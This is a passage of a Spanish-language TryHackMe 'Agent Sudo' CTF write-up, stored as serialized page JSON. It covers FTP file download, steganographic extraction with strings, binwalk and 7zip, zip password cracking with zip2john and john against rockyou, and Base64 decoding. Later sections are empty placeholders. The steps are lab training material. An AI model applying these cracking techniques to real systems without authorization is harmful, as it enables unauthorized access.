prompt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Interactive mode off.\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ftp> mget .\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"local: To_agentJ.txt remote: To_agentJ.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"<SNIP>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"local: cute-alien.jpg remote: cute-alien.jpg\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"<SNIP>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"local: cutie.png remote: cutie.png\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"<SNIP>\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Usamos el comando \"promt\" para evitar tener que confirmar manualmente la descarga de cada archivo."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"A simple vista, no hay nada fuera de lo usual en las im√°genes descargadas. El archivo de texto contiene el siguiente mensaje."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"Dear agent J,\n\nAll these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.\n\nFrom,\nAgent C\n","filename":"To_agentJ.txt","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Dear agent J,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"From,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent C\n"}]}]}]}]},{"type":"element","tag":"h3","props":{"id":"esteganograf√≠a"},"children":[{"type":"text","value":"Esteganograf√≠a"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Una de las im√°genes contiene la contrase√±a de Agent R. Debemos realizar estegoan√°lisis en busca de un mensaje escondido. Podemos realizar este proceso con muchas herramientas, pero en CTFs usualmente podremos obtener informaci√≥n oculta haciendo uso de "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"exiftool"}]},{"type":"text","value":", "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"strings"}]},{"type":"text","value":", "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"binwalk"}]},{"type":"text","value":" y "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"steghide"}]},{"type":"text","value":" (No esperes hacer uso de estas herramientas en pruebas de penetraci√≥n reales)."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"exiftool"}]},{"type":"text","value":" no revela nada importante, pero "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"strings"}]},{"type":"text","value":" si lo hace."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"strings cutie.png | head -n 20 && echo \".....\" && strings cutie.png | tail -n 20\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"strings"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cutie.png"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" |"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" head"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 20"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":" && "}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":"echo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \".....\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":" && "}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"strings"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cutie.png"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" |"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" tail"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 20\n"}]}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"strings cutie.png | head -n 20 && echo \".....\" && strings cutie.png | tail -n 20\n\n<SNIP>\nTo_agentR.txt\nW\\_z#\n2a>=\nTo_agentR.txt\nEwwT\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"strings cutie.png | head -n 20 && echo \".....\" && strings cutie.png | tail -n 20\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"<SNIP>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"To_agentR.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"W\\_z#\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"2a>=\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"To_agentR.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"EwwT\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descubrimos que la imagen contiene un archivo de texto oculto. Para extraerlo hacemos uso de "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"binwalk"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"binwalk -e cutie.png\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"binwalk"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -e"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cutie.png\n"}]}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"binwalk -e cutie.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n869           0x365           Zlib compressed data, best compression\n\nWARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly\n34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt\n\nWARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"binwalk -e cutie.png\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"DECIMAL       HEXADECIMAL     DESCRIPTION\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"--------------------------------------------------------------------------------\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"869           0x365           Zlib compressed data, best compression\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":10},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"WARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Los archivos fueron extra√≠dos en una nueva carpeta. Dentro de esta encontramos un archivo zip, sin embargo "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"unzip"}]},{"type":"text","value":" falla en extraer este archivo, por lo que debemos de usar "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"7zip"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"7zip x 8702.zip\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"7zip"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" x"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" 8702.zip\n"}]}]}]}]},{"type":"element","tag":"h3","props":{"id":"crackeo-de-zip"},"children":[{"type":"text","value":"Crackeo de zip"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"El archivo esta protegido por una contrase√±a. Para "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"crackearla"}]},{"type":"text","value":" haremos uso de "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"zip2john"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"zip2john 8702.zip > zip2john.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"zip2john"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" 8702.zip"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" >"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" zip2john.txt\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"Crackeamos"}]},{"type":"text","value":" la contrase√±a con "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"john"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"john"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" --wordlist=/usr/share/wordlists/rockyou.txt"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" zip2john.txt\n"}]}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt\n\n<SNIP>\nalien            (8702.zip/To_agentR.txt)\n1g 0:00:00:00 DONE (2025-05-30 19:47) 1.351g/s 44281p/s 44281c/s 44281C/s christal..eatme1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"<SNIP>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"alien            (8702.zip/To_agentR.txt)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"1g 0:00:00:00 DONE (2025-05-30 19:47) 1.351g/s 44281p/s 44281c/s 44281C/s christal..eatme1\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Use the \"--show\" option to display all of the cracked passwords reliably\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Session completed.\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"El archivo descomprimido contiene el siguiente mensaje."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"Agent C,\n\nWe need to send the picture to 'QXJlYTUx' as soon as possible!\n\nBy,\nAgent R\n","filename":"_cutie.png.extracted/To_agentR.txt","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent C,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"We need to send the picture to 'QXJlYTUx' as soon as possible!\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"By,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent R\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Al principio esto no parece sernos de utilidad, pero la cadena de texto \"QXJlYTUx\" puede estar codificada. Ingresamos esta cadena de texto en "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"CyberChef"}]},{"type":"text","value":". La pagina autom√°ticamente reconoce que esta cadena de texto esta codificada en Base64. Al decodificarla obtenemos la frase \"Area51\"."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"¬øObtuvimos la contrase√±a de SSH? Resulta no ser valida. Si esta imagen contiene un archivo escondido, probablemente la otra imagen tambi√©n."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"strings"}]},{"type":"text","value":" revela "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"12345"}]}]},{"type":"element","tag":"h2","props":{"id":"escalada-de-privilegios"},"children":[{"type":"text","value":"Escalada de privilegios"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripci√≥n"}]},{"type":"element","tag":"h2","props":{"id":"persistencia"},"children":[{"type":"text","value":"Persistencia"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripci√≥n"}]},{"type":"element","tag":"h2","props":{"id":"post-root"},"children":[{"type":"text","value":"Post-Root"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripci√≥n"}]},{"type":"element","tag":"h2","props":{"id":"resumen-ejecutivo"},"children":[{"type":"text","value":"Resumen ejecutivo"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripci√≥n"}]},{"type":"element","tag":"h2","props":{"id":"remediaci√≥n"},"children":[{"type":"text","value":"Remediaci√≥n"}]},{"type":"element","tag":"ol","props":{},"children":[{"type":"element","tag":"li","props":{},"children":[{"type":"text","value":"Evita el uso de contrase√±as d√©biles."}]}]},{"type":"element","tag":"h2","props":{"id":"conclusiones"},"children":[{"type":"text","value":"Conclusiones"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripci√≥n"}]},{"type":"element","tag":"style","props":{},"children":[{"type":"text","value":"html .default .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}html .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}"}]}],"toc":{"title":"","searchDepth":2,"depth":2,"links":[{"id":"escaneo","depth":2,"text":"Escaneo"},{"id":"enumeraci√≥n-de-servicios","depth":2,"text":"Enumeraci√≥n de servicios","children":[{"id":"tcp21","depth":3,"text":"TCP/21"},{"id":"tcp80","depth":3,"text":"TCP/80"}]},{"id":"explotaci√≥n","depth":2,"text":"Explotaci√≥n","children":[{"id":"ssh","depth":3,"text":"SSH"},{"id":"ftp","depth":3,"text":"FTP"},{"id":"esteganograf√≠a","depth":3,"text":"Esteganograf√≠a"},{"id":"crackeo-de-zip","depth":3,"text":"Crackeo de zip"}]},{"id":"escalada-de-privilegios","depth":2,"text":"Escalada de privilegios"},{"id":"persistencia","depth":2,"text":"Persistencia"},{"id":"post-root","depth":2,"text":"Post-Root"},{"id":"resumen-ejecutivo","depth":2,"text":"Resumen ejecutivo"},{"id":"remediaci√≥n","depth":2,"text":"Remediaci√≥n"},{"id":"conclusiones","depth":2,"text":"Conclusiones"}]}},"_type":"markdown","_id":"content:writeups:tryhackme-agent-sudo.md","_source":"content","_file":"writeups/tryhackme-agent-sudo.md","_stem":"writeups/tryhackme-agent-sudo","_extension":"md"}